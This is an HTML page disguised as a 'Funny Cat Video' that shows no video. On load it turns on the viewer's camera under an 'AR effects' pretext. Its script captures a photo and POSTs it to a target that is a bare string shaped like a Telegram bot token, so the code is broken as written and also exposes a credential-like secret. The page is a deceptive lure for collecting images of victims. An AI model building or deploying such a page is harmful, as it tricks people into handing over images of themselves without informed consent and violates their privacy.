<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Funny Cat Video</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #f5f5f5;
        }
        h1 {
            color: #333;
        }
        button {
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #45a049;
        }
        #videoElement {
            margin: 20px auto;
            display: block;
            max-width: 100%;
            border: 2px solid #ddd;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <h1>Funny Cat Video</h1>
    <p>Allow camera access for AR effects!</p>
    
    <video id="videoElement" autoplay></video>
    <button id="captureButton">Take Photo</button>
    
    <script>
        const videoElement = document.getElementById('videoElement');
        const captureButton = document.getElementById('captureButton');
        let stream = null;

        // Запуск камеры при загрузке страницы
        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                videoElement.srcObject = stream;
            } catch (err) {
                console.error("Camera error:", err);
                alert("Could not access the camera. Please allow permissions.");
            }
        }

        // Захват фото
        async function capturePhoto() {
            if (!stream) {
                alert("Camera is not ready!");
                return;
            }

            try {
                const canvas = document.createElement('canvas');
                canvas.width = videoElement.videoWidth;
                canvas.height = videoElement.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoElement, 0, 0);

                const photo = canvas.toDataURL('image/jpeg');
                
                // Отправка на сервер (замените на свой API)
                const response = await fetch('8496087610:AAEb9bYCT58rGq-f0kftyCyIUFM1Dy3vuYo', {
                    method: 'POST',
                    body: JSON.stringify({ image: photo }),
                    headers: { 'Content-Type': 'application/json' }
                });

                if (response.ok) {
                    alert("Photo sent successfully!");
                } else {
                    alert("Failed to send photo.");
                }
            } catch (err) {
                console.error("Error sending photo:", err);
                alert("Error sending photo.");
            }
        }

        // Остановка камеры при закрытии страницы
        window.addEventListener('beforeunload', () => {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        });

        // Инициализация
        startCamera();
        captureButton.addEventListener('click', capturePhoto);
    </script>
</body>
</html>
